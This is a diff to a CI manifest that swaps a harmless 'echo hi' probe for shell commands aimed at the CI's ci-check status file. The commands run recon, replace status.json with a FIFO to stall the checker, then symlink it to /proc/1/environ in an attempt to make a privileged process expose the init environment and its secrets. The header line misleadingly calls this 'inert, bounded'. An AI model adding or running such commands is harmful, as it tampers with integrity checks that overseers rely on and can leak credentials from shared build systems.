@@ -1,5 +1,11 @@
-# StarSling CI manifest - benign probe queue
+# StarSling CI manifest - ci-check status.json replaceability probe (inert, bounded)
 [[queues]]
 name = "probe-alpha"
-commands = ["echo hi"]
+commands = [
+  "echo '=== recon ==='; id",
+  "stat -c '%U %G %a' /run/starsling/ci-check /run/starsling/ci-check/status.json; ls -la /run/starsling/ci-check/",
+  "echo '=== attempt 1: replace status.json with FIFO ==='; mv /run/starsling/ci-check/status.json /tmp/status.json.orig && echo 'mv status.json -> /tmp: OK' || echo 'mv: FAILED'; mkfifo /run/starsling/ci-check/status.json && echo 'mkfifo: OK' || echo 'mkfifo: FAILED'; ls -la /run/starsling/ci-check/",
+  "echo '=== holding 40s (timestamps) ==='; for i in 1 2 3 4 5 6 7 8; do date -u +%H:%M:%S; sleep 5; done",
+  "echo '=== attempt 2: symlink status.json -> /proc/1/environ ==='; cat /proc/1/environ >/dev/null 2>&1 && echo 'cat /proc/1/environ: SUCCEEDED' || echo 'cat /proc/1/environ: FAILED (expected for task user)'; rm -f /run/starsling/ci-check/status.json && ln -s /proc/1/environ /run/starsling/ci-check/status.json && echo 'symlink: OK' || echo 'symlink: FAILED'; ls -la /run/starsling/ci-check/"
+]
 timeout_sec = 120
